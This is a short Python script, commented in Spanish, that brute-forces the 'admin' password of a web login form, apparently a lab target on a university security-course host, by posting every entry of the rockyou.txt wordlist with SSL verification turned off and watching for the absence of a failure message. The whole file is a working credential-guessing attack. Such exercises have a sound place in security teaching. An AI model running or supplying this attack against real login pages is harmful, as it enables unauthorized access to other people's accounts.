import requests
import urllib3

# ✅ Desactivar los warnings por certificados SSL no verificados
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# URL del formulario de login
url = 'https://bueno_tranqui.dsa.linti.unlp.edu.ar/login'

# Usuario objetivo
username = 'admin'

# Ruta al diccionario rockyou.txt
diccionario = './rockyou.txt'

with open(diccionario, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()

        # Enviamos la petición POST sin verificar SSL
        response = requests.post(url, data={
            'username': username,
            'password': password
        }, verify=False)

        # Si el login fue exitoso, la respuesta no tendrá "Credenciales"
        if "Credenciales" not in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            break

        # Mostrar progreso cada 100 intentos
        if i % 100 == 0:
            print(f"Probadas {i} contraseñas...")

    else:
        print("[-] Contraseña no encontrada en el diccionario.")

